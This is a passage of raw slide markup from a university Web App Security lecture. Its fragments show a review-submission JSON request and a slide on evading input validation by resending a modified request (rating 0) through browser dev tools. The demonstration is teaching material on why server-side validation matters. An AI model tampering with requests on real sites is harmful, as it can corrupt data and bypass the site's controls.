              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Ph.D.</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35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University</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>of</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Naples</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Federico</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>II</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>Technologies</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Course</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Lecture</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>23</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>App</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>Security</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="object 7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dirty="0" spc="-25"/>
              <a:t>41</a:t>
            </a:fld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EVADING</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="10"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>INPUT</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t> VALIDATION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962050" y="1533220"/>
            <a:ext cx="3075940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240029" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="95"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="240029" algn="l"/>
              </a:tabLst>
            </a:pP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The</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-9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request</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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body</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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25">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>is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962050" y="4004907"/>
            <a:ext cx="8865235" cy="1444625"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="97155" rIns="0" bIns="0" rtlCol="0" vert="horz">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="240029" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="765"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="240029" algn="l"/>
              </a:tabLst>
            </a:pP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What</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-3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if</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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we</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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send</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-2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a</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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modified</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-3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request,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-2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with</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-3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0451A4"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>"rating"</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>:</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-100">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-25">
                <a:solidFill>
                  <a:srgbClr val="098557"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>0</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-25">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>?</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="240029" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="660"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="240029" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="2800">
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>We</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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also</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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can</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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do</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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that</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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right</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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away</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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from</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-70">
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-10">
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Browser</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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Dev</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-80">
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-10">
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Tools!</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="696595" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="245"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="696595" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="2400">
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Click</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-7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on</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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“Resend”</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-7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from</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-6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the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-4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“Headers”</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-7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details</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-6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tab</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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of</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-45">
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Request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882396" y="2023872"/>
            <a:ext cx="10427335" cy="2032000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="111F35"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="31750" rIns="0" bIns="0" rtlCol="0" vert="horz">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="92075">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="250"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-50">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>{</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="342265">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="5"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="0451A4"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>"UserId"</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>:</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-40">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-25">
                <a:solidFill>
                  <a:srgbClr val="098557"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>2</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-25">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>,</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="342265">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="0451A4"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>"captchaId"</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>:</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-70">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-25">
                <a:solidFill>
                  <a:srgbClr val="098557"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>1</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-25">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>,</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="342265">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="0451A4"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>"captcha"</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>:</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-45">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="A21515"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>"80"</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>,</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="342265">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="0451A4"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>"comment"</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>:</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10"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A21515"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>"Example</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-15">
                <a:solidFill>
                  <a:srgbClr val="A21515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A21515"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>review </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="A21515"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>(***@webtech-sh.op)"</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>,</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="342265">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="0451A4"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>"rating"</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>:</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-50">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-50">
                <a:solidFill>
                  <a:srgbClr val="098557"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>3</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="92075">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="5"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-50">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/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962050" y="2675966"/>
            <a:ext cx="9328150" cy="1416050"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="95250" rIns="0" bIns="0" rtlCol="0" vert="horz">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="12700" marR="5080">
              <a:lnSpc>
                <a:spcPts val="5190"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="750"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="4800" spc="-290" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
                <a:cs typeface="Tahoma"/>
              </a:rPr>
              <a:t>SECURITY</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="4800" spc="110" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
                <a:cs typeface="Tahoma"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="4800" spc="-280" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
                <a:cs typeface="Tahoma"/>
              </a:rPr>
              <a:t>SERVICES</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="4800" spc="95" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
                <a:cs typeface="Tahoma"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="4800" spc="-45" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
                <a:cs typeface="Tahoma"/>
              </a:rPr>
              <a:t>PROVIDED </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="4800" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
                <a:cs typeface="Tahoma"/>
              </a:rPr>
              <a:t>BY</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="4800" spc="-285" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
                <a:cs typeface="Tahoma"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="4800" spc="-100" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
                <a:cs typeface="Tahoma"/>
              </a:rPr>
              <a:t>WEB</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="4800" spc="-254" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
                <a:cs typeface="Tahoma"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="4800" spc="-65" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
                <a:cs typeface="Tahoma"/>
              </a:rPr>
              <a:t>BROWSERS</a:t>
            </a:r>
            <a:endParaRPr sz="4800">
              <a:latin typeface="Tahoma"/>
              <a:cs typeface="Tahoma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4117975" y="6335674"/>
            <a:ext cx="3897629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solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Luigi</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-50">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Libero</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-30">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Lucio</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-30">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Starace,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-40">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Ph.D.</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-45">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>-</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-30">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>University</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-45">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>of</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-25">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Naples</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-35">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Federico </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>II</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-15">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>-</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-20">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-15">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-20">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Technologies</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-25">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Course</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="5">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>-</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-20">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Lecture</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-30">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>23</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-5">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>-</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-15">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-20">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>App</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-25">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Security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11049761" y="6427114"/>
            <a:ext cx="18097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25">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>45</a:t>
            </a:r>
            <a:endParaRPr sz="1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60"/>
              <a:t>WEB</a:t>
            </a:r>
            <a:r>
